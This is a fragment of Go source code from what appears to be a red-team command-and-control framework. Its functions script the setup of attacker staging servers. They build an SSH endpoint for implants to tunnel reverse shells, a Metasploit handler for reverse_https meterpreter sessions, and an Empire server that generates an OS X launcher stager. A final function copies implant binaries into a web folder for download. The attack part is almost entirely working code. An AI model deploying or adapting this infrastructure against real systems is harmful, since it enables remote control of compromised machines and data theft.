sudo chmod 664 /etc/systemd/system/%s.service
sudo systemctl daemon-reload
sudo systemctl enable %s.service
sudo service %s start

`,keypath,keypath,domainO.Domain,domainO.Domain,port,port,domainO.Domain,domainO.Domain,domainO.Domain,path,stagingName,stagingName,stagingName,stagingName,stagingName)


	return installScript_string,port,"Success"

}


/* staging_ssh_rev_shell
The rev_ssh module will create a server where a Implant can egress a ssh connection login as an anonymous user to tunnel out a 
Operating System shell.
SSH Server configurations with public key
Configure the anonymous user without shell capabilities to avoid Counter-Attacks within our staging
Set SSH as a service
*/
func staging_ssh_rev_shell(domainO *Domain,keypath string,stagingName string) (string,string,string){

	var installScript_string string
	var port string

	port = "22"
	
	//Create both installStaging.sh and removeStaging.sh on target staging Folder
	installScript_string =
	fmt.Sprintf(
`
sleep 180
sudo chmod 600 %s
sudo ssh-keygen -N "" -f /usr/local/STHive/stagings/%s/implantkey
scp -oStrictHostKeyChecking=no -i %s /usr/local/STHive/stagings/%s/implantkey.pub ubuntu@%s:/home/ubuntu/implantkey.pub
scp -oStrictHostKeyChecking=no -i %s /usr/local/STHive/tools/tools ubuntu@%s:/home/ubuntu/tools
sudo rm -f /root/.ssh/known_hosts
ssh -oStrictHostKeyChecking=no -i %s ubuntu@%s /bin/bash <<EOF
sudo apt-get update
sudo apt-get update
sudo apt-get update
sudo apt-get update
touch /home/ubuntu/ssh.log
sudo chmod +x /home/ubuntu/tools
sudo useradd anonymous
sudo usermod -s /bin/false anonymous
sudo mkdir /home/anonymous
sudo mkdir /home/anonymous/.ssh
sudo cp /home/ubuntu/implantkey.pub /home/anonymous/.ssh/authorized_keys
echo "ClientAliveInterval 60" |sudo tee -a /etc/ssh/sshd_config
echo "ClientAliveCountMax 0" |sudo tee -a /etc/ssh/sshd_config
echo "Match User anonymous" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tAllowTcpForwarding remote" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tX11Forwarding no" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tPermitTunnel no" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tGatewayPorts no" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tAllowAgentForwarding no" |sudo tee -a /etc/ssh/sshd_config
echo -e "\tAllowStreamLocalForwarding" no |sudo tee -a /etc/ssh/sshd_config
sudo reboot
EOF


sudo cp /usr/local/STHive/stagings/%s/%s.service /etc/systemd/system/
sudo chmod 664 /etc/systemd/system/%s.service
sudo systemctl daemon-reload
sudo systemctl enable %s.service
sudo service %s start

`,keypath,stagingName,keypath,stagingName,domainO.Domain,keypath,domainO.Domain,keypath,domainO.Domain,stagingName,stagingName,stagingName,stagingName,stagingName)

	return installScript_string,port,"Success"

}

/* staging_https_msft_letsencrypt
The https_msft_letsencrypt module will create a server where a Implant can egress with a meterpreter.
Use certbot to sign a let'sencrypt pem keys to be used by metasploit https handler
Install metasploit, and configure the https handler as a service in the Linux boc
*/
func staging_https_msft_letsencrypt(parameters string,domainO *Domain,keypath string,stagingName string) (string,string,string){

	var installScript_string string
	var port string

	var msf *Msf
	errDaws := json.Unmarshal([]byte(parameters), &msf)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(Staging MSF Parameters Decoding Error):",errDaws)
   		return installScript_string,port,elog
	}
	
	port = msf.HttpsPort

	//Create both installStaging.sh and removeStaging.sh on target staging Folder
	installScript_string =
	fmt.Sprintf(
`
sleep 180
sudo chmod 600 %s
sudo rm -f /root/.ssh/known_hosts
ssh -oStrictHostKeyChecking=no -i %s ubuntu@%s /bin/bash <<EOF
sudo apt-get update
sudo apt-get update
sudo add-apt-repository -y ppa:certbot/certbot
sudo apt-get update
sudo apt-get update
sudo apt-get install -y certbot
sudo certbot certonly -n --standalone --agree-tos --email email@email.xyz --preferred-challenges http -d %s
sudo DEBIAN_FRONTEND=noninteractive apt-get -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" --no-install-recommends --yes install g++ gcc autoconf automake bison libc6-dev libffi-dev libgdbm-dev libncurses5-dev libsqlite3-dev libtool libyaml-dev make pkg-config sqlite3 zlib1g-dev libgmp-dev libreadline-dev libssl-dev
sudo rm -rf /home/ubuntu/.gnupg
sudo \curl -sSL https://rvm.io/pkuczynski.asc | gpg --import -
sudo \curl -sSL https://get.rvm.io | bash -s stable
sudo /home/ubuntu/.rvm/bin/rvm install 2.6.2
sudo git clone https://github.com/rapid7/metasploit-framework
cd /home/ubuntu/metasploit-framework
sudo apt-get install -y libpq-dev libpcap-dev
sudo /home/ubuntu/.rvm/wrappers/ruby-2.6.2/gem install bundle
sudo /home/ubuntu/.rvm/wrappers/ruby-2.6.2/bundle install
sudo cat /etc/letsencrypt/live/%s/privkey.pem /etc/letsencrypt/live/%s/cert.pem >> /home/ubuntu/unified.pem
sudo apt-get install -y reptyr
sudo echo '
[Unit]
Description=STime MSF Staging
After=syslog.target network.target remote-fs.target nss-lookup.target

[Service]
Type=simple
WorkingDirectory=/home/ubuntu/
ExecStart=/home/ubuntu/.rvm/wrappers/ruby-2.6.2/ruby /home/ubuntu/metasploit-framework/msfconsole -x "use exploit/multi/handler;\
set PAYLOAD multi/meterpreter/reverse_https;\
set LHOST %s;\
set LPORT %s;\
set HandlerSSLCert /home/ubuntu/unified.pem;\
set SessionCommunicationTimeout 0;\
set ExitOnSession false;\
exploit -j"
StandardInput=tty
StandardOutput=tty
StandardError=tty
TTYPath=/dev/tty2
TTYReset=yes
TTYVHangup=yes
Restart=always
LimitNOFILE=10000
SyslogIdentifier=msf.service

[Install]
WantedBy=multi-user.target
' > /home/ubuntu/msf.service
sudo cp /home/ubuntu/msf.service /etc/systemd/system/msf.service
sudo systemctl daemon-reload
sudo systemctl enable msf.service
sudo service msf start
touch /home/ubuntu/msfconsole.log
echo "ClientAliveInterval 60" |sudo tee -a /etc/ssh/sshd_config
echo "ClientAliveCountMax 0" |sudo tee -a /etc/ssh/sshd_config
sudo reboot
EOF

sudo cp /usr/local/STHive/stagings/%s/%s.service /etc/systemd/system/
sudo chmod 664 /etc/systemd/system/%s.service
sudo systemctl daemon-reload
sudo systemctl enable %s.service
sudo service %s start

`,keypath,keypath,domainO.Domain,domainO.Domain,domainO.Domain,domainO.Domain,domainO.Domain,port,stagingName,stagingName,stagingName,stagingName,stagingName)


	return installScript_string,port,"Success"

}

/* staging_https_empire_letsencrypt
Exactly same approach that metasploit, but configuring empire
*/
func staging_https_empire_letsencrypt(parameters string,domainO *Domain,keypath string,stagingName string) (string,string,string){

	var installScript_string string
	var port string

	var empire *Empire
	errDaws := json.Unmarshal([]byte(parameters), &empire)
	if errDaws != nil {
		elog := fmt.Sprintf("%s%s","StagingCreation(Staging Empire Parameters Decoding Error):",errDaws)
   		return installScript_string,port,elog
	}
		
	port = empire.HttpsPort
	if port == "1234"{
		return installScript_string,port,"StagingCreation(Staging Empire Port 1234 not allowed, is the port used for Empire Server)"
	}
	
	//Create both installStaging.sh and removeStaging.sh on target staging Folder
	installScript_string =
	fmt.Sprintf(
`
sleep 180
sudo chmod 600 %s
sudo rm -f /root/.ssh/known_hosts
ssh -oStrictHostKeyChecking=no -i %s ubuntu@%s /bin/bash <<EOF
sudo apt-get update
sudo apt-get update
sudo add-apt-repository -y ppa:certbot/certbot
sudo apt-get update
sudo apt-get update
sudo apt-get install -y certbot
sudo certbot certonly -n --standalone --agree-tos --email email@email.xyz --preferred-challenges http -d %s
sudo git clone https://github.com/EmpireProject/Empire
cd /home/ubuntu/Empire/setup/
sudo DEBIAN_FRONTEND=noninteractive apt-get -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold" --no-install-recommends --yes install -y make g++ python-dev python-m2crypto swig python-pip libxml2-dev default-jdk libssl1.0.0 libssl-dev build-essential python-setuptools
sudo DEBIAN_FRONTEND=noninteractive STAGING_KEY=RANDOM bash install.sh
sudo pip install pefile
sudo bash -c 'cat /etc/letsencrypt/live/%s/privkey.pem > /home/ubuntu/Empire/data/empire-priv.key'
sudo bash -c 'cat /etc/letsencrypt/live/%s/cert.pem > /home/ubuntu/Empire/data/empire-chain.pem'
sudo apt-get install -y reptyr
sudo echo '
[Unit]
Description=STime Empire Staging
After=syslog.target network.target remote-fs.target nss-lookup.target

[Service]
Type=simple
WorkingDirectory=/home/ubuntu/Empire/
ExecStart=/usr/bin/python empire --rest --restport 1234 --username test --password test
StandardInput=tty
StandardOutput=tty
StandardError=tty
TTYPath=/dev/tty2
TTYReset=yes
TTYVHangup=yes
Restart=always
LimitNOFILE=10000
SyslogIdentifier=empire.service

[Install]
WantedBy=multi-user.target
' > /home/ubuntu/empire.service
sudo cp /home/ubuntu/empire.service /etc/systemd/system/empire.service
sudo systemctl daemon-reload
sudo systemctl enable empire.service
sudo service empire start
touch /home/ubuntu/empire.log
sleep 10
sudo echo \$(curl --insecure -i https://127.0.0.1:1234/api/admin/permanenttoken?token=\$(curl --insecure -i -H "Content-Type: application/json" https://localhost:1234/api/admin/login -X POST -d '{"username":"test", "password":"test"}' | grep token | cut -d '"' -f 4) | grep token | cut -d '"' -f 4) > /home/ubuntu/token
sudo curl --insecure -i -H "Content-Type: application/json" https://127.0.0.1:1234/api/listeners/http?token=\$(cat /home/ubuntu/token) -X POST -d '{"Name":"http","Host":"https://%s:%s","CertPath":"/home/ubuntu/Empire/data","Port":"%s"}'
sudo echo \$(curl -s --insecure -H "Content-Type: application/json" https://localhost:1234/api/stagers?token=\$(cat /home/ubuntu/token) -X POST -d '{"StagerName":"osx/launcher", "Listener":"http"}'| python -c "import sys, json; print json.load(sys.stdin)['osx/launcher']['Output']") > /home/ubuntu/osxPythonLauncher
echo "ClientAliveInterval 60" |sudo tee -a /etc/ssh/sshd_config
echo "ClientAliveCountMax 0" |sudo tee -a /etc/ssh/sshd_config
sudo reboot
EOF

sudo scp -oStrictHostKeyChecking=no -i %s ubuntu@%s:/home/ubuntu/osxPythonLauncher /usr/local/STHive/stagings/%s/pythonLauncher 
sudo cp /usr/local/STHive/stagings/%s/%s.service /etc/systemd/system/
sudo chmod 664 /etc/systemd/system/%s.service
sudo systemctl daemon-reload
sudo systemctl enable %s.service
sudo service %s start

`,keypath,keypath,domainO.Domain,domainO.Domain,domainO.Domain,domainO.Domain,domainO.Domain,port,port,keypath,domainO.Domain,stagingName,stagingName,stagingName,stagingName,stagingName,stagingName)


	return installScript_string,port,"Success"

}

/*
Generate a tunnel service for the target Staging, this Service is installed in Hive.
This service will create a remote tunneling connection to Hive to expose its ssh Service
In this way, operators will never connect directly to the staging server but to Hive
This is a security in depth measure to keep Operators as anonymous as possible
*/
func staging_tunnelService(domainO *Domain,tunnelPort string,stagingName string) string {

	var serviceScript_string string 

	serviceScript_string =
	fmt.Sprintf(
`
[Unit]
Description=STime %s
After=syslog.target network.target remote-fs.target nss-lookup.target

[Service]
Type=simple
WorkingDirectory=/usr/local/STHive/stagings/%s/
ExecStart=/bin/bash -c "ssh -oStrictHostKeyChecking=no -p 22 -i %s.pem -L 0.0.0.0:%s:0.0.0.0:22 -N ubuntu@%s"
Restart=on-failure
RestartSec=3
LimitNOFILE=10000
StandardOutput=syslog
StandardError=syslog
SyslogIdentifier=%s.service

[Install]
WantedBy=multi-user.target

`,stagingName,stagingName,domainO.Name,tunnelPort,domainO.Domain,stagingName)

	return serviceScript_string
}

/*
Generate a removal script for target Staging
*/
func staging_removeScript(stagingName string) string {

	var removeScript_string string
	
	removeScript_string =
	fmt.Sprintf(
`
sudo rm -f /root/.ssh/known_hosts
sudo service %s stop
sudo systemctl disable %s.service
sudo rm -f /etc/systemd/system/%s.service
sudo systemctl daemon-reload

`,stagingName,stagingName,stagingName)

	return removeScript_string

}


//Utility Infra Staging Functions: Interact with resources, to destroy them, or hide stuff...

/*
Description: Destroy target Staging Infraestructure
Flow:
A.Execute terraform destroy over the cretion plans
B.Execute removal script for clean Hive Staging tunnel Service
*/
func destroyStagingInfra(stagingName string) string{

	//Go to folder apply deletes
	terraApply :=  exec.Command("/bin/sh","-c", "cd /usr/local/STHive/stagings/"+stagingName+";sudo ./terraform destroy -auto-approve")
	terraApply.Start()
	errInfra1 := terraApply.Wait()
	
	if (errInfra1 != nil){
		elog := "TaraformerError(RemoveStagingInfra): "+errInfra1.Error()
		return elog
	}

	rmScript :=  exec.Command("/bin/bash","/usr/local/STHive/stagings/"+stagingName+"/removeScript.sh")
	rmScript.Start()
	rmScript.Wait()

	return "Done"
}


/*
Description: Drop an Implant in target Dropplet
Flow:
A.SCP the file
B.Move the file to target apache web folder
*/
func dropImplant(implantName string,stagingName string,sDomainName string,path string,os string,arch string,filename string) string{
	var errbuf bytes.Buffer

	domainO := getDomainFullDB(sDomainName)

	dropScript :=  exec.Command("/bin/sh","-c","sudo scp -i /usr/local/STHive/stagings/"+stagingName+"/"+sDomainName+".pem /usr/local/STHive/implants/"+implantName+"/bichito"+os+arch+" ubuntu@"+domainO.Domain+":/home/ubuntu/"+filename)
	dropScript.Stderr = &errbuf
	dropScript.Start()
	dropScript.Wait()


	if errbuf.String() != "" {
		return errbuf.String()
	}
	errbuf.Reset()

	mvScript :=  exec.Command("/bin/sh","-c","sudo ssh -i /usr/local/STHive/stagings/"+stagingName+"/"+sDomainName+".pem ubuntu@"+domainO.Domain+" 'sudo mv /home/ubuntu/"+filename+" /var/www/html/"+path+"/"+filename+"'")
	
	//dropScript.Stdout = &outbuf
	mvScript.Stderr = &errbuf
	mvScript.Start()
	mvScript.Wait()

	if errbuf.String() != "" {
		return errbuf.String()
	}


	return ""

}